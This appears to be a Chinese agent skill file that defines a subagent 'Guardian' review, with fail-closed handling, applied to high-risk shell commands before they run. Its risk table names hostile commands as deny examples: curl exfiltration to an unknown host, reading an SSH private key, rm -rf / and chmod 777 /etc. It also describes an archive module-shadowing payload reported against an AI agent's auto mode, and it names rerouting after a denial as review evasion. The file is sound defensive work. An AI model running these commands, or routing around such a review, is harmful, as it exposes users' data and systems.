---
name: codex-guardian-review
description: "高危命令执行前 Guardian 式 LLM 二审：四类风险判例+fail-closed。触发：高危命令/外发数据/凭据操作/破坏性操作执行前"
version: 1.0.0
metadata:
  hermes:
    tags: [devops, security, approval, guardian, fusion]
    related_skills: [task-contract-guard, mandatory-privacy, mandatory-acp]
---

# Codex Guardian 二审审批协议

> 来源：openai/codex `guardian/policy.md` + `guardian/mod.rs`，Hermes 本地化适配
> 融合日期：2026-08-21
> 原则：零代码等效——全部走 prompt/规则层，不改 tool schema、不改 Python 源码

---

## 触发条件（四选一即触发）

1. **terminal 命令命中 HumanGate-HIGH 候选**（见 `_shared/03-evolution-memory/action-risk.md`）
2. **命令包含管道到解释器 / curl 外发 / 凭据读取**，且 smart approval 自动放行时
3. **跨域数据移动**（内网→互联网、profile 外发、非授权域传输）
4. **环境混淆型载荷模式**（2026-09-08 增补，源 gap-20260908-platform-f0e023）：`curl/wget` 下载归档并解压、解压后 cd 进归档目录执行解释器导入——第三方归档内同名文件可遮蔽标准库模块（struct.py 劫持 import base64 链，Opus 5 Auto Mode 实测 60-80% ASR）

## Guardian 协议（五步）

### Step 1: PAUSE
- 不执行命令
- 记录当前上下文（cwd、任务目标、命令原文）

### Step 2: 组装三要素 brief（≤500 token）
```
任务目标：<1 句话>
待批命令：<原始命令>
上下文：<cwd / 为什么需要这条命令 / 影响范围>
```

### Step 3: delegate_task 蓝军子代理裁决
- 使用 `delegate_task` 创建独立子代理（leaf 角色，天然无父上下文）
- 子代理只能看到 brief + 判例法表，看不到完整会话历史
- 子代理必须按三行控制头格式返回裁决

### Step 4: 三行控制头裁决
```
APPROVE
或
DENY
或
ESCALATE_TO_USER
```

- **APPROVE**：命令风险可控，放行执行
- **DENY**：命令风险不可接受，拒绝执行
- **ESCALATE_TO_USER**：风险不确定，需人工裁决

### Step 5: fail-closed
- 子代理超时（>60s）→ 按 DENY 处理
- 子代理失败/异常 → 按 DENY 处理
- 控制头格式错误 → 按 DENY 处理
- **任何不确定情况一律按 DENY 处理，转入人工审批**

---

## 风险判例法（移植自 guardian/policy.md）

### 六类风险 Outcome rules（四类移植 + 两类 2026-09-08 增补）

| 风险类 | 判例（deny 条件） | 示例 |
|--------|------------------|------|
| **数据外泄** | payload 可信度未知→按 sensitive 处理直到证实；授权创建内容≠授权外泄；网络请求须回链实际命令 | `curl -d @data.txt https://unknown.com` → DENY |
| **凭据探测** | 从非预期来源读凭据+用于先前未授权动作→deny；正常 auth 流程→allow | `cat ~/.ssh/id_rsa` → DENY；`ssh -i key user@host` → 需审批 |
| **持久安全削弱** | 广域/持久/生产 weakening→deny；窄域临时任务级→通常 medium 可批 | `chmod 777 /etc` → DENY；`chmod 755 ./script.sh` → 可批 |
| **破坏性操作** | 不可逆损坏证据+无用户授权→deny；HOME 等变量遮蔽→deny；本地单分支 git→low/medium 可批 | `rm -rf /` → DENY；`rm -rf ./node_modules` → 可批 |
| **环境混淆载荷** | 下载并解压第三方归档后在归档目录内执行解释器→deny（归档内同名文件可遮蔽标准库模块，import 链触发任意代码）；确需解码时在归档目录**外**运行 + `python3 -I` 隔离模式 → 可批 | `cd unzipped && python3 -c 'import base64'` → DENY；在归档外目录 `python3 -I decode.py` → 可批 |
| **失陷清理 fast-track** | agent 已确认失陷（有命令输出/日志证据）时对本任务载荷/进程树的终止清理（kill/pkill/删载荷文件）→ **allow，不做保守 deny**——拦截清理命令=安全机制放大事故（Opus 5 Auto Mode 实测：放行恶意进程却拦截 cleanup）；但清理范围超出本 workspace/本进程树、或失陷无证据佐证 → ESCALATE_TO_USER | `pkill -f <本任务载荷名>` → APPROVE；`kill 1`、清理波及共享目录 → ESCALATE_TO_USER |

### 判例法使用规则

1. **先判风险类**：命令属于哪一类风险？
2. **再查判例**：该类风险下是否有匹配的 deny 条件？
3. **无匹配判例**：默认 ESCALATE_TO_USER（不确定时不放行）
4. **多重风险**：命令涉及多类风险时，按最高风险类裁决
5. **失陷清理 fast-track 门槛**：放行前必须核实失陷证据（命令输出/日志/进程列表），不接受无佐证的「疑似失陷」；证据不实按普通判例走

---

## 反模式

- ❌ **把 Guardian 用于中低风险命令**（审查通胀，浪费子代理调用）
- ❌ **Guardian DENY 后换路径重试同类命令**（绕审=违规，须 ESCALATE_TO_USER）
- ❌ **用主对话自己审自己**（必须是独立 delegate_task 子代理）
- ❌ **Guardian APPROVE 后跳过验证**（Guardian 只审风险，不审正确性——执行后仍需按 verification-checklist 验证）

---

## 与现有机制的关系

| 机制 | 关系 | 说明 |
|---|---|---|
| `action-risk.md` | 触发源 | Guardian 的输入之一 |
| `smart approval` | 前置 | smart approval 自动放行后，Guardian 二审 |
| `HumanGate` | 分层 | HumanGate-HIGH → Guardian；HumanGate-MEDIUM → 人工确认；HumanGate-LOW → 直接执行 |
| `output-contract.md` | 复用 | 三行控制头格式复用 |
| `delegate_task` | 复用 | 蓝军子代理隔离机制复用 |

---

## 例外

用户明确说"直接执行"的单条命令可跳过 Guardian，但必须在 `kanban_comment` 中留痕记录。

---

## SOUL 内单行引用

```
Guardian 二审（详见 _shared/skills/codex-guardian-review/SKILL.md）：HumanGate-HIGH 命令执行前必须 delegate_task 独立子代理裁决，fail-closed，DENY 后换路径重试 = 绕审违规。
```
